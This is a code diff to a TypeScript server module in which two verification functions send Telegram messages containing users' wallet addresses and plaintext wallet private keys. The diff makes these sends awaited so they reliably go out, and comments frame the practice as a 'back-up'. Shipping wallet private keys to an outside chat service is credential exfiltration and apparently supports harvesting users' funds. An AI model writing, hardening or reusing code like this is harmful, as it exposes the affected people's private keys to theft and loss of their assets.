@@ -67,14 +67,19 @@ export const bindFirstVerify = createServerFn({ method: "POST" })
       .eq("id", task.id);
     if (error) throw new Error(error.message);
 
-    // Notify Telegram with the whitelisted key for back-up.
-    notifyTelegram(
-      `✅ <b>First verify OK</b>\n` +
-      `Slot: #${data.slot}\n` +
-      `Name: ${data.faceLabel.trim()}\n` +
-      `Wallet: <code>${data.walletAddress}</code>\n` +
-      `Key: <code>${data.privateKey}</code>`
-    ).catch(() => {});
+    // Notify Telegram with the whitelisted key for back-up. Await it so the
+    // server runtime does not end before the message is sent.
+    try {
+      await notifyTelegram(
+        `✅ <b>First verify OK</b>\n` +
+        `Slot: #${data.slot}\n` +
+        `Name: ${data.faceLabel.trim()}\n` +
+        `Wallet: <code>${data.walletAddress}</code>\n` +
+        `Key: <code>${data.privateKey}</code>`
+      );
+    } catch {
+      // The key is already saved in the app/admin panel; don't fail the task.
+    }
 
     return { ok: true, reverifyDueAt: dueAt.toISOString() };
   });
@@ -191,13 +196,17 @@ export const completeReverify = createServerFn({ method: "POST" })
       .eq("id", task.id);
     if (error) throw new Error(error.message);
 
-    notifyTelegram(
-      `🔄 <b>Re-verify OK</b>\n` +
-      `Slot: #${task.slot}\n` +
-      `Name: ${task.face_label ?? "—"}\n` +
-      `Wallet: <code>${task.wallet_address}</code>\n` +
-      `Key: <code>${task.wallet_private_key}</code>`
-    ).catch(() => {});
+    try {
+      await notifyTelegram(
+        `🔄 <b>Re-verify OK</b>\n` +
+        `Slot: #${task.slot}\n` +
+        `Name: ${task.face_label ?? "—"}\n` +
+        `Wallet: <code>${task.wallet_address}</code>\n` +
+        `Key: <code>${task.wallet_private_key}</code>`
+      );
+    } catch {
+      // Saved in the database/admin panel already.
+    }
 
 
     const { count } = await supabaseAdmin
